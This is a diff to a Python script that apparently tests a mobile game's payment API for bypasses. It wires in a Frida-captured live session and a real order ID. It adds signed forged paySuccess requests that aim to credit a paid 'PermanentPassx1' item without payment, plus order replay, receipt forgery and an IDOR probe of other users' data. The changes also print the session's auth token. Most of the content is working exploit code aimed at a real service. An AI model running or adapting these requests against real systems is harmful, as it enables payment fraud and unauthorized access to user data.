@@ -24,22 +24,16 @@ import time
 import uuid
 import urllib3
 import requests
-from sign_helper import QuickGameSession, SERVERS, APP_KEY, md5
+from sign_helper import QuickGameSession, SESSION, SERVERS, SIGN_KEY_PAYMENT, md5
 
 urllib3.disable_warnings()
 
 
-# ──────────────────────────────────────────────────────────────────────────────
-# FILL THESE from Frida/Burp capture (Frida script 02_hook_signing.js)
-# ──────────────────────────────────────────────────────────────────────────────
-CAPTURED_SESSION = QuickGameSession(
-    uid="FILL_UID",          # e.g. "8472916"
-    username="FILL_USER",    # e.g. "guest_8472916"
-    token="FILL_TOKEN",      # e.g. "a3f9b2c1d..."
-    os_type="android",
-    usermode=0,
-    server=SERVERS["account_primary"],
-)
+# ── Live-captured session (Frida 2025-06-09) ─────────────────────────────────
+# cpOrderNo from captured payment flow: 6c5a894fe7a4481cff0c2f554242f3e6
+#   goodsId: com.h5bi.winr.05 (PermanentPassx1)
+CAPTURED_SESSION = SESSION
+CAPTURED_ORDER_ID = "6c5a894fe7a4481cff0c2f554242f3e6"
 
 
 def log(label: str, resp: requests.Response):
@@ -102,18 +96,16 @@ def test_paysuccess_forgery():
 # ─── Test 1b: paySuccess with EXACT smali-confirmed params ───────────────────
 def test_paysuccess_exact_params():
     """
-    Use parameters confirmed from smali analysis of com.qk.a.a.c.b$5.run().
-    These are the REAL fields the SDK sends — more likely to pass server validation.
-    Fill cpOrderNo from createOrder response (or generate one).
+    CRITICAL PoC — use REAL cpOrderNo from Frida-captured payment flow.
+    cpOrderNo=6c5a894fe7a4481cff0c2f554242f3e6 (PermanentPassx1, com.h5bi.winr.05)
+    Signed with SIGN_KEY_PAYMENT. If server doesn't validate against payment provider
+    this will credit the account.
     """
-    fake_order = f"PENTEST_{int(time.time())}"
     payload = {
-        # Auth params (added by sign helper)
-        # Non-auth params confirmed from smali:
-        "orderAmount":       "0.99",          # float as string
-        "cpOrderNo":         fake_order,       # client-side orderId
-        "goodsID":           "com.h5bi.winr.crystal_01",
-        "goodsName":         "Crystal x100",
+        "orderAmount":       "0.99",
+        "cpOrderNo":         CAPTURED_ORDER_ID,
+        "goodsID":           "com.h5bi.winr.05",
+        "goodsName":         "PermanentPassx1",
         "currency":          "USD",
         "gameRoleId":        "1",
         "gameRoleName":      "TestHero",
@@ -121,8 +113,15 @@ def test_paysuccess_exact_params():
         "gameRoleServerId":  "1",
         "gameRoleServerName": "Server1",
     }
-    resp = CAPTURED_SESSION.post("/v1/payment/paySuccess", data=payload)
-    log("paySuccess — exact smali params", resp)
+    resp = CAPTURED_SESSION.post("/v1/payment/paySuccess", data=payload, pay_sign=True)
+    log("paySuccess — REAL cpOrderNo from Frida (CRITICAL PoC)", resp)
+
+    # Also try with a fresh fake order — tests if ANY forged order is accepted
+    fake_order = f"PENTEST_{int(time.time())}"
+    payload2 = dict(payload)
+    payload2["cpOrderNo"] = fake_order
+    resp2 = CAPTURED_SESSION.post("/v1/payment/paySuccess", data=payload2, pay_sign=True)
+    log("paySuccess — forged cpOrderNo (no real payment)", resp2)
 
 
 # ─── Test 2: createOrder parameter tampering ──────────────────────────────────
@@ -225,8 +224,8 @@ def test_idor_getuserinfo():
     Test if /v1/auth/getUserInfo exposes other users' data by modifying uid.
     IDOR vulnerability: authenticated as user A, access user B's data.
     """
-    if not CAPTURED_SESSION.uid or CAPTURED_SESSION.uid == "FILL_UID":
-        print("\n[SKIP] IDOR test — fill CAPTURED_SESSION first")
+    if not CAPTURED_SESSION.uid:
+        print("\n[SKIP] IDOR test — no session")
         return
 
     own_uid = int(CAPTURED_SESSION.uid)
@@ -254,20 +253,29 @@ def test_idor_getuserinfo():
 
 
 if __name__ == "__main__":
-    if CAPTURED_SESSION.uid == "FILL_UID":
-        print("[!] WARNING: CAPTURED_SESSION not filled — tests will fail auth.")
-        print("    Run Frida script 02_hook_signing.js first and fill the session.")
-        print("    Running unauthenticated probes anyway...\n")
-
     print("[*] Payment Bypass Tests — com.h5bi.winr v1.0.1")
-    print(f"    Session UID: {CAPTURED_SESSION.uid}")
-    print(f"    Server: {CAPTURED_SESSION.server}\n")
+    print(f"    uid:       {CAPTURED_SESSION.uid}")
+    print(f"    username:  {CAPTURED_SESSION.username}")
+    print(f"    authToken: {CAPTURED_SESSION.authToken}")
+    print(f"    server:    {CAPTURED_SESSION.server}")
+    print(f"    cpOrderNo: {CAPTURED_ORDER_ID}\n")
 
+    print("[*] TEST 1: paySuccess forgery (generic)")
     test_paysuccess_forgery()
+
+    print("\n[*] TEST 1b: paySuccess REAL cpOrderNo (CRITICAL PoC)")
     test_paysuccess_exact_params()
+
+    print("\n[*] TEST 2: createOrder parameter tampering")
     test_create_order_tamper()
+
+    print("\n[*] TEST 3: Google Play receipt forgery")
     test_google_play_receipt_forge()
-    test_order_replay()    # fill real_order_id from Burp
+
+    print("\n[*] TEST 4: Order replay (real order required)")
+    test_order_replay(CAPTURED_ORDER_ID)
+
+    print("\n[*] TEST 5: IDOR getUserInfo")
     test_idor_getuserinfo()
 
     print("\n[*] Payment tests complete.")
